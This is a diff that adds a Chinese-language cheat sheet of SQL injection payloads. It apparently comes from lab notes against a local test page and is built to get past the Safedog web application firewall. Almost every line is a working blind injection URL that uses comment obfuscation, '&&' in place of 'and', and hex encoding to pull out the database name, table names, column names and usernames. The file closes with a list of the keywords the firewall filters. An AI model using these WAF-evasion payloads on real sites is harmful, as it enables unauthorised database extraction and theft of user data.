@@ -1,0 +1,25 @@
+Xor True #返回错误页面
+Xor False #返回真确页面
+%26%26 true #返回正确页面 %26=&
+%26%26 false #返回错误页面
+/**//*!order*//**/by/**/3 #安全狗不拦截
+
+盲注
+http://127.0.0.1/sqli.php?id=1%20%26%26%20(length(database/**/())=4) #安全狗不拦截
+http://127.0.0.1/sqli.php?id=1%20%26%26%20(length(hex(database/**/()))=8) #安全狗不拦截
+http://127.0.0.1/sqli.php?id=1%20%26%26%20(left(hex(database/**/()),8)=74657374) #安全狗不拦截
+
+http://127.0.0.1/sqli.php?id=1%20%26%26%20(1=(select%20count(/*!table_name*/)%20from%20information_Schema.tables%20where%20table_schema=0x74657374)) #安全狗不拦截
+http://127.0.0.1/sqli.php?id=1%20%26%26%20hex/**/(substr((select%20concat(/*!TaBle_nAme*/)%20from%20information_schema.taBles%20where%20table_schema=0x74657374%20limit%200,1),1,1)) #安全狗不拦截
+http://127.0.0.1/sqli.php?id=1%20%26%26%20hex/**/(substr((select%20concat(/*!TaBle_nAme*/)%20from%20information_schema.taBles%20where%20table_schema=0x74657374%20limit%200,1),1,1))=75 #安全狗不拦截
+
+http://127.0.0.1/sqli.php?id=1%20%26%26%20hex/**/(substr((select%20concat(/*!Column_nAme*/)%20from%20information_schema.Columns%20where%20table_name=0x7573657273%20limit%200,1),1,1)) #安全狗不拦截
+http://127.0.0.1/sqli.php?id=1%20%26%26%20hex/**/(substr((select%20concat(/*!Column_nAme*/)%20from%20information_schema.Columns%20where%20table_name=0x7573657273%20limit%200,1),1,1))=69 #安全狗不拦截
+
+http://127.0.0.1/sqli.php?id=1%20%26%26%20(1=(select%20count(/*!username*/)%20from%20users)) #安全狗不拦截
+http://127.0.0.1/sqli.php?id=1%20%26%26%20hex/**/(substr((select%20concat(/*!uSeRnaMe*/)%20from%20users%20limit%200,1),1,1)) #安全狗不拦截
+http://127.0.0.1/sqli.php?id=1%20%26%26%20hex/**/(substr((select%20concat(/*!uSeRnaMe*/)%20from%20users%20limit%200,1),1,1))=61 #安全狗不拦截
+
+
+安全狗过滤的有：
+and,or,union,select,敏感函数(如：database()),information_Schema数据库(安全狗默认关闭)
